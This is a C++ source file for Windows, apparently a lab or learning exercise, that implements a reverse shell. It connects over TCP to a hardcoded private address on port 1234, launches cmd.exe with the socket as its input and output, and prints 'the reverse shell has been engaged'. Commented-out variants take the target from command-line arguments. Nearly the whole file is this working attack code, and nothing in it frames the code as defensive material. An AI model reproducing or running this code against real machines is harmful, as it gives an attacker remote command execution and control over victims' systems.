#include "stdafx.h"
#include <ws2tcpip.h>
#include <winsock2.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "ws2_32")

using namespace std;

WSADATA wsaData;
SOCKET theSocket;
STARTUPINFO theProcess;
PROCESS_INFORMATION info_proc;
struct sockaddr_in Winsocket_Structure;
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
SECURITY_ATTRIBUTES saAttr;
char chBuf[6] = "DIR\n";
DWORD dwRead, dwWritten;

//void engageShell(SOCKET &theSock);

int main(int argc, char *argv[])
{
	int searchInput = 0;
	char *IP = "192.168.24.128";
	short port = 1234;

	cout << "Hello World";
	cout << endl << endl;
	cout << "initiating connection to " << argv[1] << " on port " << argv[2] << endl;
	cout << endl << endl;
	cout << "also ip is " << IP << " and port is " << port << endl;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	theSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	
	Winsocket_Structure.sin_port = htons(port);
	Winsocket_Structure.sin_family = AF_INET;
	inet_pton(AF_INET, IP, &(Winsocket_Structure.sin_addr.s_addr));

	cout << endl << endl;
	cout << "the final info is " << Winsocket_Structure.sin_addr.s_addr << endl;

	if ((theSocket == INVALID_SOCKET)) {
		cout << "invalid sockwet configuration" << endl;
		WSACleanup();
		return 1;
	}
	
	if ((WSAConnect(theSocket, (SOCKADDR*)&Winsocket_Structure, sizeof(Winsocket_Structure), NULL, NULL, NULL, NULL) == SOCKET_ERROR))
	{
		cout << "connetion error: please check your parameters" << endl;
		WSACleanup();
		return 1;
	}
	else {
		cout << "connected" << endl;
		cout << "opening gate for commands" << endl;


		LPTSTR szRun = TEXT("cmd.exe");

		ZeroMemory(&theProcess, sizeof(theProcess));
		theProcess.cb = sizeof(theProcess);
		theProcess.dwFlags = STARTF_USESTDHANDLES;
		ZeroMemory(&info_proc, sizeof(info_proc));

		TCHAR szDir[1024], szCmd[MAX_PATH + 1];
		GetCurrentDirectoryW(sizeof(szDir), szDir);
		wcscpy_s(szCmd, szRun);

		theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)theSocket;
		//theProcess.hStdInput = g_hChildStd_IN_Rd;

		if (CreateProcess(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, szDir, &theProcess, &info_proc) == 0) {
			cout << "problem creating the process" << endl;
		}
		else {
			cout << "the reverse shell has been engaged" << endl;

			/*
			saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			saAttr.bInheritHandle = TRUE;
			saAttr.lpSecurityDescriptor = NULL;

			if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
				cout << "PIPE ERROR" << endl;
			}
			else {
				cout << "SUCCESS WITH PIPE!" << endl;
				cout << "Writing to pipe..." << endl;


				bool status = WriteFile(g_hChildStd_IN_Wr, "cmd.exe\n", sizeof("cmd.exe\n"), &dwWritten, NULL);

				if (status) {
					cout << "yasss bitch" << endl;
				}
				else {
					cout << "Failed to write to pipe :(" << endl;
				}
			}
			*/
		}
	}

	cin >> searchInput;
	return 0;


	/*
	int searchInput = 0;
	char *IP = argv[1];
	short port = atoi(argv[2]);

	cout << endl << endl;
	cout << "initiating connection to " << argv[1] << " on port " << argv[2] << endl;
	cout << endl << endl;
	cout << "also ip is " << IP << " and port is " << port << endl;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	theSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	
	Winsocket_Structure.sin_port = htons(port);
	Winsocket_Structure.sin_family = AF_INET;
	inet_pton(AF_INET, IP, &(Winsocket_Structure.sin_addr.s_addr));

	cout << endl << endl;
	cout << "the final info is " << Winsocket_Structure.sin_addr.s_addr << endl;

	if ((theSocket == INVALID_SOCKET)) {
		cout << "invalid sockwet configuration" << endl;
		WSACleanup();
		return 1;
	}
	if ((WSAConnect(theSocket, (SOCKADDR*)&Winsocket_Structure, sizeof(Winsocket_Structure), NULL, NULL, NULL, NULL) == SOCKET_ERROR))
	{
		cout << "connetion error: please check your parameters" << endl;
		WSACleanup();
		return 1;
	} else {
		cout << "connected" << endl;
		cout << "opening gate for commands" << endl;

		memset(&theProcess, 0, sizeof(theProcess));
		theProcess.cb = sizeof(theProcess);
		theProcess.dwFlags = STARTF_USESTDHANDLES;

		//io redirection
		theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)theSocket;

		if (CreateProcess(NULL, _T("cmd.exe"), NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc) == 0) {
			cout << "problem creating the process" << endl;
		}
		else {
			cout << "the reverse shell has been engaged" << endl;
		}
	}

	cin >> searchInput;
	return 0;
	*/
}

void engageShell(SOCKET &theSock)
{
	/*
	memset(&theProcess, 0, sizeof(theProcess));
	theProcess.cb = sizeof(theProcess);
	theProcess.dwFlags = STARTF_USESTDHANDLES;

	//io redirection
	theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)theSock;

	if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc) == 0) {
		cout << "problem creating the process" << endl;
	}
	else {
		cout << "the reverse shell has been engaged" << endl;
	}
	*/
}